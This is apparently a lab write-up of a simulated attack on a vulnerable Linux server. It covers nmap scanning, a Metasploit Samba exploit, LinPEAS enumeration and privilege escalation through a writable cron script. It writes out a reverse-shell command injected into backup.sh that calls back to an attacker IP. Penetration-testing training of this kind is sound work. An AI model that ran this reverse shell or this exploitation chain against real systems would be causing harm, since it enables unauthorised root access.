
# Privilege Escalation Detection Lab: Red vs Blue Simulation
real-world cyber attack against a vulnerable Linux server and demonstrates how such activity can be detected using the ELK Stack.

started 17:25 

## 1. Reconnaisance

<img src="pingsweep.png" alt="Ping sweep result" width="500">

Performed a ping sweep on the subnet to probe any active hosts on the network. Our target machine as for this project is victim2, which is identified as 192.168.42.156

## 2. Enumeration phase

<img width="600" src="https://github.com/user-attachments/assets/061ca039-cfdd-412f-b1a1-2e805f7beb7b" />

NMAP port scan results provided us with multiple exposed service. Our main interest in this list is samba, because it is an attractive target due to its reputation of
vulnerability. Moreover, this Samba service was running an outdated version which made it particularly interesting
for further exploitation. 


For further enumeration about any intel about service, OS etc, I used this command:

```bash
nmap --script smb-os-discovery 192.168.42.156
```

<img width="501" src="https://github.com/user-attachments/assets/00a37059-2638-4f97-9d40-cd8a5be4e07c" />



## 3. Initial Access

<img width="847" src="https://github.com/user-attachments/assets/f25bf71c-41a8-4386-b8a9-7349c6e6f2b6" />

I narrowed the search for samba by filtering the search to exploits only with a ranking of excellent, 
since those have a higher chance of working reliably./samba/is_known_pipename turned out to be the best optino to gain shell on the target system

<img width="698" src="https://github.com/user-attachments/assets/224c0323-cd18-4a83-b056-c3413f8aa78e" />

The exploit was a success, and we managed to gain shell access to victim2.
Running whoami confirmed that shell is running on root privileges, as shown in the output


## 4. Discovery

<img width="320" src="https://github.com/user-attachments/assets/c22198c4-a8db-4ff1-b486-3c6626e547ca" />

After gaining access to shell, we want to further enumerate possible entry points in terms of exploitation. 
LINpeas is a privilege escalation enumeration tool designed for Linux. It is used to find possible vulnerabilities on the system once you gained control of it. 


<img width="772" src="https://github.com/user-attachments/assets/ed153a6c-9fc7-418b-832f-2de09ebcc01f" />

etc/sudoers.d/README is writable. If these filese are writable by a normal user, this could lead to modification of sudo rules which can lead to privilege escalation to root.


<img width="423" src="https://github.com/user-attachments/assets/e8f37139-eea8-4cb0-91fa-23569d7aceb1" />

Several active ports and servuces, such as those mentioned in nmap in addition to local services local in localservice itself. 


<img width="455" src="https://github.com/user-attachments/assets/82a870fc-cbbf-45b3-ac5f-1b05b7752440" />

There is no crontab configured but there are several jobs running under "cron.daily" and "cron.weekly". 
Some of the cron directories are writable, which means a low privileged user could modify the .sh scripts. If that happens, maliious commands could be executed seamlessly with root privileges, leading to privilege escalation. Critical yet we want to attack now, try find entry point


## Exploit - Crontab misconfiguration
<img width="963" src="https://github.com/user-attachments/assets/c5fe70f0-aef9-4dd9-be3a-82ac8a73ff14" />

backup.sh, running every minute. we can try feed in malicious script but need to locate


<img width="174" src="https://github.com/user-attachments/assets/47709978-7deb-4c7b-9f50-cbf633c8b717" />

found in /lucas directory, probably a user hehe. Inject malicious reverse shell script

printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.42.234/2590 0>&1\n' > backup.sh

meterpreter seemingly responded well on the request

We now have root access from user 

<img width="829" height="305" alt="image" src="https://github.com/user-attachments/assets/ad6c0210-861e-4a5f-911d-dbdcb84fc600" />
